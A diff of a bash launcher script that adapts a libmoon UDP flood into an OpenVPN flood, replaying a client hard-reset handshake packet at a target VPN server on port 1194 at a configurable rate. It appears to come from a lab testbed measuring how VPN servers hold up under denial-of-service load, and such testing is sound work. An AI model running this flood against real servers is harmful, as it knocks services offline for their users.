@@ -2,7 +2,7 @@
 
 # sudo script.sh <ipSrc> <ipDst> <attackRate> <duration>
 # e.g.
-# sudo bash udpFlood.sh 172.31.116.132 172.31.116.137 40000 10 24 64
+# sudo bash ovpnFlood.sh 172.31.116.132 172.31.116.137 1000 10
 
 # cd to directory of script
 scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
@@ -18,26 +18,24 @@ ipDst=$2
 attackRate=$3
 seconds=$4
 
-flows=${5:-1}
-pktLength=${6:-252} #default value 252
-port=${7:-443} # default value 443
+flows=${7:-1} #default value 1
 
 # more fixed configuration values (adjust if needed)
 ethSrc="3c:fd:fe:9e:8e:39"
-udpSrc=$port
+udpSrc=1194
 
-# VPN server addresses
 ethDst="b0:aa:77:2f:ab:1a"
-udpDst=$port
+udpDst=1194
 
 
 ############## Flood Start ##############
 
-$libmoonBuild/libmoon udpFlood.lua \
+$libmoonBuild/libmoon ovpnFlood.lua \
     --seconds $seconds --threads 20 --rate $attackRate \
-    --pktLength $pktLength \
+    --pchrcv2Pcap p_control_hard_reset_client_v2.pcap \
+    --flows $flows \
     --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
     --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
     --startConfirmation \
-    --outputDevStats stats \
+    --outputDevStats stats.txt \
     0
